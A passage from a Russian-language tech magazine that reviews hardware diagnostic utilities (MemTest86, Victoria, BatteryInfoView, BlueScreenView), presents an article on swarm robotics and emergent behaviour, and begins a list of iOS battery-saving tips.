приходится на ту эпоху, когда PC ещё в помине не было. Гуру системного про-
граммирования Крис Брэди (Chris Brady) реализовал в MemTest86 алгоритмы
поиска ошибок в работе оперативной памяти, которые использовал еще на
компьютерах DEC PDP-11.





Современная версия программы всё так же написана на Си и ассемблере,
поэтому обладает рекордно малыми размерами. Она использует собствен-
ный загрузчик, а значит легко запускается с (мультизагрузочной при желании)
флэшки и не зависит от установленной на компьютер операционной системы.
Такие качества не просто делают ее универсальной, но и позволяют достичь
беспрецедентной полноты проверки ОЗУ. Большинство других утилит не спо-
собы проверять области памяти, занятые собственным раздутым кодом и мно-
гочисленными системными процессами.
   Существует известный форк — MemTest86+, но его развитие было пре-
кращено в конце 2013 года на пятой версии. Тем временем оригинальный
MemTest86 уже достиг версии 6.1. Программа поддерживает все современные
технологии (64-bit, UEFI, Secure Boot, GPT), стандарты DDR4 и Intel XMP 2.0, но-
вые чипсеты и многоядерные процессоры. Также в ней доступен расширенный
набор тестов памяти, которым просто нет альтернативы.
   Всего в программу встроено тринадцать тестов, использующих различные
подходы для обнаружения дефектов чтения и записи. Они помогают опреде-
лить «плавающие» проблемы, которые проявляются только в необычных ус-
ловиях и не поддаются воспроизводству при быстрой проверке в сервисном
центре. Полный и максимально тщательный тест одного модуля памяти может
занимать до суток чистого времени.
   Ряд тестов был написан с учетом известных недостатков совместной работы
распространенных чипов и контроллеров памяти. Такие тесты используют для
проверки совместимости модулей ОЗУ друг с другом, чипсетом материнской
платы и процессором. Отдельные тесты предназначены для проверки стабиль-
ности работы в жестких условиях эксплуатации (короткие тайминги, высокие
напряжения, большие частоты) и сценариях с обработкой больших объемов
данных.
  С февраля 2013 года MemTest86 стала развиваться как продукт фирмы
PassMark, поэтому теперь существует в платной и бесплатной версиях. По-
следняя не позволяет создавать настраиваемые отчеты и сохранять их в файл,
не поддерживает новые тесты с продвинутыми процессорными инструкциям,
не способна загружать параметры из конфигурационного файла, не умеет от-
ключать кеш процессора для более точной локализации проблем с памятью
и имитировать ошибки контроля четности для проверки памяти с поддержкой
ECC. В остальном ее возможности аналогичны платной — их должно хватить
для некоммерческого применения.

VICTORIA
http://hdd-911.com
По своей известности эта легендарная утилита сравнима с MemTest. Она вы-
полняет максимально полную диагностику жестких дисков, включая опреде-
ление и переназначение сбойных секторов. Ещё программа умеет снижать
уровень шума накопителя при операциях поиска путем изменения параметра
AAM (Automatic Acoustic Management). Вдобавок, она позволяет задавать поль-
зовательский пароль на доступ к жесткому диску, который сохраняется в его
служебной зоне. Даже если ты не любишь вводить лишние пароли, все равно
не помешает перестраховаться, иначе за тебя пароль может назначить тро-
ян-шифровальщик.





Главное отличие Victoria от многочисленных программ диагностики винчесте-
ров заключается в возможности работать с дисками напрямую (режим PIO) и
выполнять низкоуровневые команды. Помимо простого считывания общих па-
раметров S.M.A.R.T. она обрабатывает и те, которые добавляют некоторые
производители дисков. Здесь же можно принудительно запустить короткий или
полный набор тестов самодиагностики жесткого диска. Проверка качества по-
верхности выполняется по разным алгоритмам в режимах «чтение», «запись» и
«проверка» (запись с последующим считыванием), а все секторы классифици-
руются по времени отклика. Сбойные блоки можно попытаться переназначить
в резервную область (remap), а в платной версии доступна функция восстанов-
ления (restore).
   Многие кабели SATA не соответствуют требуемым характеристикам. Про-
изводители уменьшают толщину проводников и применяют медь низкого ка-
чества, пренебрегают золочением контактов и экономят на пайке. Как резуль-
тат — часто возникают дисковые ошибки, которые нельзя воспроизвести на
тестовом стенде. Сам диск остается исправным, как и порт материнской платы.
Поэтому отдельно Victoria тестирует качество физического интерфейса (кабе-
ли IDE/SATA) и уведомляет о встречаемых проблемах.





   Автор утилиты — белорусский программист Сергей Казанский. Технически
Victoria представляет собой софтовую часть программно-аппаратного ком-
плекса PC3000 для восстановления данных, но многие функции способна вы-
полнять без него. Сначала Victoria развивалась как утилита для DOS, поскольку
в однозадачной среде гораздо легче работать с накопителем. Последняя офи-
циальная версия программы для DOS — 3.52, она написана в 2006 году.
   Сейчас развивается только версия для Windows. С появлением драйвера
porttalk.sys добавился режим доступа к винчестерам через API, а выбор дисков
и вся работа с ними стала гораздо нагляднее. В 2008 году вышла последняя бе-
та-версия — 4.46. Сейчас сайт разработчика заброшен, а программу пытаются
развивать энтузиасты, выпуская неофициальные апдейты. Например, в версии
4.47 добавили поддержку 64-разрядных систем и возможность полноценной
работы с винчестерами объемом более 1 ТБ. Экспериментальную версию 4.47
с исходным кодом внесенных исправлений можно скачать здесь.

BATTERYINFOVIEW
http://www.nirsoft.net/utils/battery_information_view.html
Перед выполнением на ноутбуке низкоуровневых операций вроде перепрошив-
ки BIOS или перемещения логических разделов, следует проверить состояние
аккумуляторной батареи. Внезапное отключение электропитания может пре-
вратить устройство в «кирпич». Встроенные программные средства Windows
и фирменные утилиты часто скрывают полные характеристики аккумулятора,
ограничиваясь формальным отображением статуса и уровня заряда в «попуга-
ях». Узнать реальное положение вещей поможет всеядная утилита производ-
ства NirSoft. Она поддерживает все виды аккумуляторов, включая старинные
никель-кадмиевые и никель-металл-гидридные.





В окне программы отображается модель аккумулятора, его тип и серийный
номер, производитель, дата производства, расчетная и фактическая емкость,
число циклов перезарядки, процент износа, пороги отключения для защиты от
глубокого разряда, расчетное время автономного питания при текущей нагруз-
ке и максимально возможное с момента полной зарядки. У конкретной модели
перечень свойств может быть неполным, но утилита честно пытается считать
всю доступную информацию.
   Дополнительно в ее настройках можно задать время опроса и составить
расписание автоматического протоколирования в лог-файл для расширенной
диагностики батареи. Все данные по умолчанию обновляются каждые десять
секунд, но могут и отображаться в режиме реального времени. Среди пара-
метров указываются текущая емкость батареи в процентах и абсолютных еди-
ницах (мВт⋅ч либо мА⋅ч — на выбор пользователя), напряжение на клеммах с
точностью до милливольта и общий статус батареи (заряжается, разряжается,
неисправна). Все данные можно сохранить в текстовый файл, HTML или XML.
Программа поддерживает режим командной строки. Для нее также есть руси-
фикатор.

Стресс-тест

Иногда, чтобы убедиться, что всё работает нормально, надежнее использовать
не специализированный тест, а программу, которая надолго загрузит компью-
тер. Можно считать контрольные суммы, число Пи, шахматные ходы или нагру-
жать процессор бессмысленными инструкциями, но гораздо полезнее будет
помочь с расчетами какой-нибудь научной затее. Для этого достаточно скачать
BOINC и выбрать задачу. Процессор и видеокарта будут заняты неограниченно
долгое время, если разрешить это в настройках. Каждое задание выполняет-
ся минимум тремя компьютерами, а статус проверки отображается в профиле
участника.





На скриншоте — пример ошибок в научных расчётах у компьютера с проблема-
ми в подсистеме ОЗУ. При обычной офисной нагрузке он работал более-ме-
нее стабильно и глючил лишь изредка. По отдельности модули памяти прохо-
дили MemTest86, но вместе начинали сбоить при большой нагрузке. Краткие
стресс-тесты (AIDA64, Prime95, SuperPi и т.п.) тоже не выявляли ошибок.




BLUESCREENVIEW
Аппаратные проблемы часто сопровождаются выпадением Windows в синий
экран. Отображаемые на нем коды системных ошибок для большинства поль-
зователей выглядят неинформативно. Понять суть возникшей проблемы помо-
жет утилита BlueScreenView. Она сканирует файлы мини-дампов и расшифро-
вывает найденные ошибки.





По умолчанию малые дампы создаются всякий раз, когда система падает в BSoD.
Эти файлы с расширением .dmp хранятся в каталоге \WINDOWS\Minidump, если
им не указали другое место. Каждый из них содержит стандартный код ошиб-
ки и четыре параметра, поясняющих детали. Включить создание минидампов
можно и вручную — через панель управления и вкладку «Свойства системы»,
либо напрямую модифицировав соответствующий ключ реестра:

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl]
  "CrashDumpEnabled"=dword:00000003

Обычно синий экран появляется при сбоях в работе какого-то драйвера или
подсистемы оперативной памяти. С помощью BlueScreenView легко отличить
программные ошибки от аппаратных, найти некорректно работающее обору-
дование или неправильно установленные драйверы.
   Отчет утилиты содержит такие сведения, как дата и время возникновения
сбоя, предположение о нарушении в работе определенного драйвера с указа-
нием его версии и места на диске, адрес сбойного блока памяти и тип операции,
которую не удалось на нем выполнить (чтение/запись). Прямо из окна програм-
мы можно сделать поиск описания возникшей проблемы, передав ее параметры
как ключевые слова в запросе к Google. Для утилиты есть русификатор.
   Администраторам будет полезна функция управления по сети. BlueScreenView
можно использовать для удаленного считывания мини-дампов с других ком-
пьютеров. Каждой машине присваивается свое имя, а протоколы сохраняются с
указанием IP-адреса в простом текстовом формате с разделителями на выбор.
   Администраторам будет полезна функция управления по сети. BlueScreenView
можно использовать для удаленного считывания мини-дампов с других компью-
теров. Каждой машине присваивается свое имя, а протоколы сохраняются с ука-
занием IP-адреса в простом текстовом формате с разделителями на выбор.
   К сожалению, это единственная утилита в обзоре, работоспособность ко-
торой мне проверить не удалось. Все компоненты тестировались до сборки,
а готовый компьютер не сбоил ни разу.
Сцена
ИСКУССТВЕННАЯ
   ТУПОСТЬ


 ДАЖЕ РОБОТАМ ИНОГДА ЛУЧШЕ МЕНЬШЕ
    ДУМАТЬ И БОЛЬШЕ ДЕЙСТВОВАТЬ





                                        Олег Парамонов
                                             paramonov@gmail.com




Вообрази, что разрабатываешь алгоритм, который
должен управлять группой автономных роботов.
Перед тобой стоит задача: они должны прочесать
окрестности, разыскать все объекты определенно-
го типа, а затем собрать находки в одной точке. За-
чем? Можешь представить, что действие происходит
на другой планете и на роботов возложена важная
научная миссия.

Ты пытаешься понять, как поступили бы на месте роботов обычные люди —
с руками, ногами и, возможно, в скафандрах. Если у них есть голова на плечах,
они не возьмутся за работу, пока не станет ясно, кто, что и как должен делать.
Во-первых, каждый участник поисковой группы должен понимать, куда возвра-
щаться с добычей. Если не договориться о точке сбора заранее, то все разбре-
дутся в разные стороны и толку не будет. Во-вторых, необходимо четко поде-
лить зоны ответственности. В противном случае в некоторых местах побывает
сразу несколько роботов, а кое-где, очень вероятно, ни одного.
  Дальше труднее. Что делать, если одна из машин свалится в пропасть и про-
падет, не доведя поиски до конца? Роботы должны самостоятельно понять, что
план нарушен, а затем найти замену выбывшему из игры собрату. Получает-
ся, нужен механизм, при помощи которого они будут следить друг за другом
и координировать действия во время операции. Поскольку непосредственное
общение каждого с каждым годится только для малочисленных групп, придется
строить иерархию. А это значит, что требуется план Б на случай неприятностей
с одним из лидеров. Угодить в пропасть может и он.
  Поверишь ли ты, что нужная программа умещается в шесть байт, полно-
стью реализует все необходимые для решения поставленной задачи модели
поведения роботов и предусматривает все частные случаи? Как такое возмож-
но? Дело в том, что наши рассуждения начались с неверной посылки, когда
мы взяли за основу алгоритма поведение людей. Люди — никудышный пример
для подражания!

ЗИМА БЛИЗКО
Первые исследователи, которые работали в области искусственного интеллек-
та, не сразу осознали, насколько сложная проблема перед ними стоит. Они
пытались моделировать человеческое мышление, отталкиваясь от формаль-
ной логики, но обнаружили, что такой подход годится лишь для шахматных про-
грамм и автоматических решателей теорем. Он не работает без четких правил
и понятных абстракций, а они в реальном мире — большой дефицит.
  К восьмидесятым годам прошлого века стало ясно, что эта научная область
зашла в тупик и света в конце тоннеля не видно. Энтузиазм, а за ним и финан-
сирование стали иссякать. Сейчас этот период называют «зима искусственно-
го интеллекта».
   Наступающая «зима» вынудила специалистов по робототехнике задумать-
ся о приоритетах. Автономные роботы невозможны без искусственного интел-
лекта, но кто сказал, что им нужен интеллект человеческого типа? Кто сказал,
что сложное поведение требует суждений, анализа и понимания, не говоря уж
о сознании? Существование примитивных животных, которые порой лишены
не только мозга, но даже нервных узлов, доказывает обратное.
   Возьмем, к примеру, простейшие одноклеточные микроорганизмы — аме-
бы, относящиеся к виду Dictyostelium discoideum. Строение амеб не оставляет
места для наивного антропоморфизма. Что бы эти существа ни делали, они
определенно не думают — им просто нечем. У них нет памяти или сознания. Вну-
тренности амеб представляют собой суп из органических молекул — не столь-
ко биология, сколько химия. Тем не менее диктиостелиумы демонстрируют
на удивление сложное поведение.
  В обычной ситуации они кормятся и размножаются так же, как другие раз-
новидности одноклеточных. Но если для амеб наступают голодные времена,
все становится гораздо интереснее. Когда еды почти не остается, они начи-
нают стремиться друг к другу и сбиваться в группы. Десятки тысяч организмов,
собравшихся в одной точке, образуют клеточный слизевик — своеобразного
слизня, которого можно различить даже без микроскопа. Совместными усили-
ями амеб слизевик ползет вперед, пока не достигает подходящего места. Там
он встает на хвост и распространяет споры.





Этот слизень состоит из десятков тысяч отдельных амеб

Механизм, который стоит за этими процессами, куда проще, чем результат.
Строительство слизевика начинается с безусловной реакции одиночных ор-
ганизмов на внешний раздражитель. С точки зрения программиста, это одна
строчка «если… то»: если амеба испытывает голод, то выделять вещество под
названием циклический аденозинмонофосфат и белки-гликопротеиды. Пер-
вое вынуждает других амеб направиться к источнику «запаха», а вторые делают
поверхность организма липкой. Прибывающие амебы слипаются и образуют
ядро будущего слизевика. Чем больше группа, тем интенсивнее «запах» и тем
выше вероятность того, что остальные амебы направятся именно в их направ-
лении.
   Диктиостелиумы не планируют строительство слизевика. Они не координи-
руют и не контролируют действия коллектива, если комок амеб можно обозна-
чить этим словом. Они не осознают ни что происходит, ни где они находятся.
От начала и до самого конца каждая амеба действует совершенно независимо
от других, следуя крайне простым правилам. Тем не менее их примитивные ре-
акции складываются в нечто более сложное, чем каждый элемент группы в от-
дельности.
   Наступающая «зима искусственного интеллекта» подтолкнула специали-
стов по робототехнике присмотреться к поведению таких существ вниматель-
нее. Идея о том, что группы роботов могут быть способны выполнять сложные
задачи, не обладая точной моделью окружающей среды и не планируя свои
действия, а лишь реагируя на стимулы, полностью противоречила классиче-
ским представлениям об искусственном интеллекте. Но тридцать лет назад это
перестало быть проблемой — классический подход потерпел провал.
  В конце восьмидесятых новое направление исследований получило назва-
ние. Американский физик Джерардо Бени, который экспериментировал с груп-
пами роботов, предложил термин «роевой интеллект», который используют
до сих пор.

ПЛОДЫ КОЛЛЕКТИВИЗАЦИИ
«Реальность такова, что группу роботов, с которой мы имеем дело, нельзя на-
звать просто группой, — объясняет Бени в научной работе, опубликованной
в 1989 году. — Она обладает определенными характеристиками, которые
роднят ее с роями насекомых. Мы наблюдаем децентрализацию управления
и отсутствие синхронизации. Отдельные роботы просты и (почти) идентичны.
Кроме того, важную роль играет еще и размер группы, то есть количество ее
участников».
  Важнейшее свойство роевого интеллекта — самопроизвольное возникно-
вение коллективного поведения, не свойственного отдельным элементам роя.
В амеб-диктиостелиумов не заложена программа строительства слизевика.
Отдельные муравьи не знают, как организовать транспортировку тяжелых гру-
зов. Отдельные пчелы не умеют отражать атаки гигантских шершней. Алгорит-
мы их действий куда проще и зачастую не требуют даже коммуникации. Однако
действия всего роя, складывающиеся из примитивных действий его участни-
ков, куда сложнее и позволяют решать такие задачи, которые не под силу оди-
ночным особям.





Группа муравьев несет жука

Классический пример коллективного поведения — образование и движение
стай птиц. С человеческой точки зрения такая слаженность невозможна без ие-
рархии. Если есть стая, значит, должен быть вожак, так ведь? Оказывается, нет.
В 1986 году специалист по компьютерной графике Крейг Рейнольдс проде-
монстрировал, что организованное движение стаи — это неожиданно сложный
результат набора простых правил, которым независимо друг от друга следуют
образующие ее птицы.
   Рейнольдс разработал компью-
терную модель, где в трехмерном
пространстве движутся однотипные
компьютерные агенты — так назы-
ваемые боиды. Каждый боид сле-
дует трем принципам. Во-первых,
он старается держать дистанцию
между собой и другими боидами.
Во-вторых, боид  старается  дви-
гаться примерно туда же, куда на-
правляются его соседи. В-третьих,
его влечет туда, где других боидов
больше всего (но лишь до тех пор,
пока это не вступает в противоречие с другими принципами).
   Этих трех принципов достаточно, чтобы группа боидов сбилась в стаю ис-
ключительно натурального вида — без централизованного управления, иерар-
хии и даже коммуникации. Стаи прекрасно работают и без этого. Более того,
без этого они работают лучше. Децентрализованный алгоритм образования
стаи с равной легкостью справляется с любым количеством боидов — и с очень
маленьким, и с очень большим. Стаю невозможно разрушить, удалив одного
из боидов, — отряд не заметит потери бойца и спокойно полетит дальше. Вдо-
бавок стая быстро реагирует на стимулы, о существовании которых известно
лишь небольшому числу участников.
  Многие из этих преимуществ отмечены уже в той статье Бени, которая вво-
дит термин «роевой интеллект». Он пишет, что роевые роботы просты, взаимо-
заменяемы и, в принципе, могут быть даже одноразовыми. Почему бы и нет?
Ни один элемент роя не может считаться незаменимым. Выбывающих робо-
тов тут же заменяют другие. Такая избыточность придает рою впечатляющую
устойчивость к разрушительным внешним воздействиям. Многие авторы так-
же отмечают гибкость и масштабируемость роя. Уменьшаясь и увеличиваясь
в размерах, он может адаптироваться к самым различным задачам.

ТУПОЙ И ЕЩЕ ТУПЕЕ
Задача про поиск и сбор объектов, с которой мы начали, позаимствована из ра-
боты, опубликованной специалистами по робототехнике из Шеффилдского
университета. Их, правда, волновали вовсе не далекие планеты, а более прак-
тический вопрос: до какой степени можно упростить и удешевить роевых ро-
ботов. Интерес понятен: строительство роботов — это в принципе недешевое
занятие. Если же роботов должно быть много (а их должно быть много, иначе
какой это рой?), самой важной научной миссией становится экономия.
   Ученые из Шеффилда взялись за эксперименты. Можно ли обойтись
без коммуникации между отдельными элементами роя? Пример боидов дока-
зывает, что можно. Значит, роботы останутся без средств связи. Под нож идут
и лишние датчики — уцелел единственный оптический сенсор на носу. Что еще
не нужно? Судя по тем же амебам, не нужны мозги. Что ж, можно попробовать
оставить робота без бортового компьютера.
   Вот как будет работать такая машина. Оптический сенсор определяет цвет
объектов, которые находятся прямо перед ним. Роботы и их потенциальная
добыча окрашены по-разному, поэтому значения на выходе сенсора не тре-
буют интерпретации. Красный — впереди добыча. Зеленый — другой робот.
Белый — стены помещения, где проходит эксперимент. Каждому из этих трех
цветов соответствует пара числовых значений, которые определяют скорость
и направление вращения правого и левого колеса робота. Чтобы реализовать
такую связь, не нужны ни вычисления, ни логические операции, ни запомина-
ющие устройства.
   Три пары скоростей — это и есть программа, целиком и полностью опи-
сывающая поведение шеффилдских роботов, те самые шесть байт, о которых
мы говорили. Чтобы подобрать оптимальный набор параметров, вызываю-
щий нужное поведение, разработчики использовали эволюционный алгоритм.
Для этого они разработали компьютерную модель арены, груза и самих робо-
тов и начали экспериментировать. Первые итерации заполняли список скоро-
стей случайными числами. Алгоритм тестировал набор за набором и отбирал
те, которым удавалось продвинуться дальше других. Их брали в качестве базы
для следующего поколения — и повторяли этот процесс снова. За несколько
десятков тысяч итераций алгоритм находил такую шестерку параметров, кото-
рая позволяла роботам не просто справляться с поставленной перед ними за-
дачей, но и делать это быстро и слаженно.
  Пришло время проверить, как такой подход работает на практике. Тут ав-
торы исследования немного сжульничали: они не стали разрабатывать сверх-
дешевые безмозглые машины собственной конструкции, а воспользовались
роботами e-puck, которых часто используют для моделирования группового
поведения.





E-puck

E-puck представляет собой двухколесную «шайбу» размером 7,4 на 5,5 см.
Каждое колесо приводится в движение отдельным шаговым моторчиком, ко-
торый подчиняется командам микроконтроллера со встроенной оперативной
памятью объемом 8 Кбайт и 144 Кбайт флеша. Кроме них, в e-puck скрывается
неплохая коллекция датчиков, а также цветная видеокамера — не очень каче-
ственная, но вполне работоспособная. Итоговая стоимость робота может пре-
вышать тысячу долларов. Иными словами, не вполне то, что нужно, но сгодится
на роль прототипа.
   Большинство датчиков не потребовалось. Видеокамера заменила оптиче-
ский сенсор; по правде говоря, это даже усложнило дело: пришлось разраба-
тывать подпрограмму, которая ужимает картинку до горстки пикселей, а затем
определяет, какой цвет преобладает. Другая подпрограмма имитировала без-
условную реакцию на замеченный цвет, переключая скорости. Осталось окле-
ить «шайбы» зеленой бумагой и рассеять по арене красные цилиндры из пено-
пласта — добычу. Можно запускать.
   Вот тактика роя, которую описывают пресловутые шесть байт. Сначала ро-
боты расползаются в стороны, высматривая красные цилиндры. Найдя их, они
образуют большое кольцо и начинают двигаться навстречу друг другу, толкая
цилиндры перед собой. Если в стороне осталась незамеченная добыча, это
не беда. Рано или поздно роботы отрываются от своего хоровода и окружают
потерянные объекты. Минут через пять все будет сделано: все цилиндры со-
браны в одной точке, а роботы теснятся рядом с ними.





Этапы большой охоты

Изменение числа роботов не влияет на действенность такого метода. Если их
мало, они, возможно, провозятся дольше, но результат будет тем же. Более
того, в процессе экспериментов выяснилось, что даже умение различать дру-
гих роботов — это роскошь. Можно обойтись и без этого. Результат не меня-
ется, если оптический сенсор путает других роботов с добычей или же просто
не видит их.

РОЕВАЯ ПОДГОТОВКА
Исследователями из Гарварда двигал тот же интерес к дешевизне и миниатю-
ризации, но они, в отличие от коллег из Шеффилда, уже перешли от прото-
типов к делу. Недавно специалисты из группы по исследованиям самоорга-
низующихся систем при Гарвардском университете продемонстрировали рой,
состоящий из 1024 элементов. Стоимость компонентов для сборки отдельных
роботов, которых окрестили «килоботами», составляет всего 14 долларов.
   Несмотря на миниатюрность и фантастическую дешевизну, килоботам
не свойственен шеффилдский аскетизм. Их создатели исходили из того, что
машинкам понадобятся «мозги», способные потянуть SDASH — уже существу-
ющий алгоритм управления коллективными роботами. Кроме того, они должны
уметь двигаться вперед, разворачиваться, общаться с ближайшими соседями
и оценивать, на каком расстоянии они находятся. Все эти требования также
вытекают из решения использовать SDASH. Помимо этого, разработчики соч-
ли необходимым сделать так, чтобы килоботы могли оценивать освещенность
и каким-то образом демонстрировали свое внутреннее состояние (это серьез-
но упростит отладку).





Килоботы

В итоге получилось вот что. Сердцем каждого килобота стал хорошо знако-
мый самодельщикам микроконтроллер ATmega328 — именно он используется
в Arduino Uno. Процессор работает с тактовой частотой 8 МГц и снабжен 32
Кбайт оперативной памяти. У робота нет ни колес, ни ножек: машинка ползает
по гладкой поверхности со скоростью до сантиметра в секунду при помощи пары
вибромоторов. На пузе килобота закреплены светодиоды и фотодиоды, пере-
дающие и принимающие световые сигналы в инфракрасном диапазоне. Они
нужны для коммуникации с соседями. Кроме того, яркость замеченных ИК-им-
пульсов позволяет с точностью до миллиметра оценить, далеко ли те находятся.
  В августе 2014 года создатели килоботов показали, на что способны эти
малыши. Роботы научились по команде выстраиваться, образуя собой силуэт
заложенного в них изображения — без планирования, иерархии и централи-
зованного управления. Все, что для этого нужно, — поддерживать три модели
поведения. Первая: пограничное движение. Килоботы должны по возможности
перемещаться вдоль края группы, никогда не отрываясь от коллектива. Вто-
рая: градиентное построение. Килобот может испускать особый сигнал, кото-
рый подхватят и передадут по цепочке его соседи. Самое первое сообщение
имеет нулевое значение, но соседи увеличат его на единицу, на следующем
шаге оно станет равно двум и так далее. В результате каждый узнает, далеко
ли источник сигнала. Наконец, третья и последняя: локализация. Роботы оце-
нивают расстояния до ближайших соседей и используют их как точки отсчета
в локальной системе координат.
   Что получается в итоге, проще показать, чем описать словами.





ДАЛЬНИЙ ПРИЦЕЛ
Если спросить у специалистов по робототехнике, зачем все это может понадо-
биться, чаще всего звучат примеры военно-полевого характера. И это можно
понять. С одной стороны, у армии есть деньги, и она готова их тратить, не ожи-
дая немедленного результата. DARPA и другие американские агентства подоб-
ного толка играли и продолжают играть важную роль в финансировании ис-
следований в области искусственного интеллекта. С другой стороны, многие
преимущества роевых роботов по-настоящему заметны лишь в самой недру-
желюбной среде — а у военных таких сред хоть отбавляй.
  Военные аналитики давно обсуждают, какие возможности откроет развитие
роевой робототехники. Косяки автономных подводных аппаратов будут выстра-
ивать разведывательные сети в глубинах океана и помогать выслеживать вра-
жеские субмарины. «Умные» мины станут автоматически перераспределяться,
чтобы в минном поле не вышло прорехи, через которую просочится неприятель.
Возможен, впрочем, и альтернативный вариант: гурьба асоциальных роботов,
старающихся держаться подальше друг от друга, поможет избавиться от мин.





Нетрудно придумать и гражданские применения. Они, пожалуй, кажутся даже
более реалистичными. Автономным автомобилям, которые разрабатывают
в Google и других компаниях, было бы неплохо поучиться у общественных жи-
вотных более эффективным моделям совместных действий. У людей в этой об-
ласти учиться нечему: стокилометровая пробка — это вершина коллективного
поведения автомобилиста. Еще одной областью применения интеллекта роя
могут стать интернет вещей и миниатюрные сенсорные сети. «Умным» устрой-
ствам будущего по определению придется обходиться без внимания человека,
так почему бы не делать это сообща?
   Вопрос лишь в том, когда это произойдет. Компьютерные специалисты за-
думались о роевом мышлении тридцать лет назад, но исследования, которые
они ведут, трудно назвать даже первыми шагами — речь идет скорее о плани-
ровании этих первых шагов. А раз так, нам лучше набраться терпения.
 Mobile
ВСЕГДА НА СВЯЗИ
     20 СОВЕТОВ, КОТОРЫЕ ПОЗВОЛЯТ
   ТВОЕМУ iДЕВАЙСУ ПРОЖИТЬ ДОЛЬШЕ





                                         Виктор Паперно
                                                   vpap1997@inbox.ru




Смартфон может разрядиться в самый неподходя-
щий момент. Ты достаешь его из кармана и видишь
цифру один или два рядом со значком батареи. Заряд
еще есть, но при запуске любого приложения смарт-
фон мгновенно отключится. Чтобы не доводить аппа-
 рат до такого состояния, можно применить несколько
 нехитрых трюков, о которых мы и поговорим в статье.

 iOS во многом автоматизированная система. Wi-Fi ищется сам, телефон сам
 определяет уровень сигнала сотовой связи, проверяет, не нуждаются ли твои
 приложения в обновлении, не пришло ли новое письмо на почту. Все это очень
 удобно и очень энергозатратно. Надо исправлять.

 1. ОТКЛЮЧАЕМ WI-FI И BLUETOOTH
 Модуль Wi-Fi, если он включен, постоянно сканирует пространство на предмет
 поиска «знакомых» сетей. Чтобы уменьшить расход аккумулятора, рекомендую
 отключать Wi-Fi и Bluetooth на периоды длительной недоступности Wi-Fi (ушел
 в поход, например). С другой стороны, в городской среде, где много открытых
 точек доступа, Wi-Fi лучше оставить работать: постоянное включение/отключе-
 ние модуля выжрет из аккумулятора больше энергии, чем постоянная работа
 в энергосберегающем режиме. Про Bluetooth, думаю, пояснять не стоит.

 2. СНИЖАЕМ ЯРКОСТЬ ЭКРАНА
 После выхода новых моделей iPhone на подсветку его экрана стало уходить за-
 метно больше энергии. По умолчанию яркость настраивается автоматически,
 в зависимости от освещения, что тоже требует получения сведений от датчи-
 ков. Для начала уберем авторегуляцию: «Настройки -> Экран и яркость», от-
 ключаем пункт «Автояркость». Отлично, но экран по-прежнему вовсю светится,
 поэтому снижаем яркость вручную.

 3. ОТКЛЮЧАЕМ ГЕОЛОКАЦИОННЫЙ МОДУЛЬ
 Один из самых затратных в плане энергии модуль — это GPS. Но отключать его
 целиком и полностью чревато неприятностями, ведь он необходим програм-
 ме «Найти iPhone», очень часто спасающей пользователей от потери ценного
 устройства. Что же делать? Переходим по адресу «Настройки -> Конфиден-
 циальность -> Службы геолокации» и либо полностью отключаем геолокацию
 приложениям, либо разрешаем определять наши координаты в момент ис-
 пользования. Кроме этого, можно отключить геолокацию в системных службах:
 «Геолокационные iAd», «Диагностика и использование», «Популярное рядом»,
 «Пробки», «Часовой пояс» и «Часто посещаемые места».

 4. ОТКЛЮЧАЕМ ФУНКЦИЮ АВТОМАТИЧЕСКОГО
 ПОВОРОТА ЭКРАНА
 Функция автоматического поворота экрана работает за счет встроенного ак-
 селерометра, причем использует его постоянно, что также влияет на аккумуля-
 тор. Вызвав «Пункт управления» свайпом снизу вверх, заблокируй эту функцию.
 Отмечу, что эффект будет заметен только на iPad, так как на iPhone функция
 автоповорота рабочего стола и многих приложений заблокирована.

 5. ОТКЛЮЧАЕМ ВИБРАЦИЮ
 Вибромотор — очень жадное до батареи устройство. Если виброзвонок и ви-
 броотклик тебе не особо нужны, то настоятельно рекомендую отключить эти
 функции. Зайди в меню «Настройки -> Звуки» и деактивируй вибрацию как во
 время звонка, так и в бесшумном режиме.

 6. ИЗБАВЛЯЕМСЯ ОТ ПАРАЛЛАКС-ЭФФЕКТА
 Параллакс-эффект постоянно получает данные от датчиков движения, и это
 тоже сажает батарейку. Чтобы его отключить, следует перейти по адресу «На-
 стройки -> Основные -> Универсальный доступ» и активировать пункт «Умень-
 шение движения».

 7. ИСПОЛЬЗУЕМ СТАТИЧЕСКИЕ ОБОИ
 Начиная с седьмой версии в iOS появилась возможность установить динами-
 ческие обои без jailbreak-твиков. Логично предположить, что они расходуют
 больше энергии, чем статические. Иди в «Настройки -> Обои -> Выбрать новые
 обои» и выбирай из стандартных снимков и фотопленки.

 8. ОТКЛЮЧАЕМ УВЕДОМЛЕНИЯ
 Без всякого сомнения, уведомления — это удобно, но лишь тогда, когда это
 действительно что-то важное: письмо, СМС или напоминание. Когда новое
 приложение спрашивает разрешение на отправку уведомлений, мы отвечаем
 «Да», даже не задумываясь о том, как это сажает аккумулятор. Поэтому впредь
 не раздаем кому попало право отправлять нам уведомления, а заодно запре-
 щаем уведомлять нас тех, кто уже это делает. Переходим в «Настройки -> Уве-
 домления» и отключаем оповещения от всяких игр и ненужных приложений.

 9. ОТКЛЮЧАЕМ СИНХРОНИЗА-
ЦИЮ С ICLOUD
 По умолчанию iOS постоянно синхрони-
 зируется с iCloud и другими облаками (на-
 пример, Google, если ты добавил свой ак-
 каунт), а каждое обращение к iCloud — это
 выход в интернет и, соответственно, еще
 несколько процентов от заряда батареи.
 Отключить синхронизацию можно в «На-
 стройки -> Почта, адреса, календари
 -> Загрузка данных». Для максимальной
 экономии следует, во-первых, отключить
 Push-уведомления, а во-вторых, на вклад-
 ке «Выборка» выбрать пункт «Вручную».
   Это кардинальный способ для экстре-
 малов. Всем остальным рекомендую пе-
 рейти в «Настройки -> Почта, адреса,
 календари -> iCloud» и выборочно отклю-
 чить те сервисы, которые не нужны. К при-
 меру, ты можешь отключить «Календари»,
 «Напоминания»,  «Заметки»,  «Passbook»
 и прочую ерунду, а оставить только син-
 хронизацию контактов и фото.

                                          Отключаем лишние возможности iCloud
 10. ОТКЛЮЧАЕМ ФОНОВОЕ
ОБНОВЛЕНИЕ КОНТЕНТА
 Во всех прошивках  от  Apple, начиная
 с седьмой версии, функция «Обновление
 контента» включена по умолчанию. Это зна-
 чит, что установленные приложения могут
 запрашивать у системы обновление своих
 данных (лента твиттера, новости, погода),
 а система будет время от времени группи-
 ровать эти запросы и выполнять их. Про-
 блема в том, что нередко фоновое обнов-
 ление нужно всем кому ни попадя и на них
 будет расходоваться трафик и батарейка.
 Чтобы отключить такие приложения, пере-
